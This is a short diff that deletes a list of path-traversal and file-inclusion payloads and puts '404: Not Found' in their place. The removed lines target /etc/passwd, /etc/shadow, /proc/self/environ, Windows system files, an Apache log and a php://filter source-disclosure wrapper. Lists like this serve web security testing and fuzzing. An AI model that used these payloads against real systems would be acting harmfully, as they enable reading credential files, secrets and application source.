@@ -1,10 +1,1 @@
-../../../../etc/passwd
-../../../../etc/shadow
-/etc/passwd
-/windows/win.ini
-../../../../windows/system32/drivers/etc/hosts
-/proc/self/environ
-/var/log/apache2/access.log
-php://filter/convert.base64-encode/resource=index.php
-../../../../etc/group
-/proc/self/cmdline
+404: Not Found
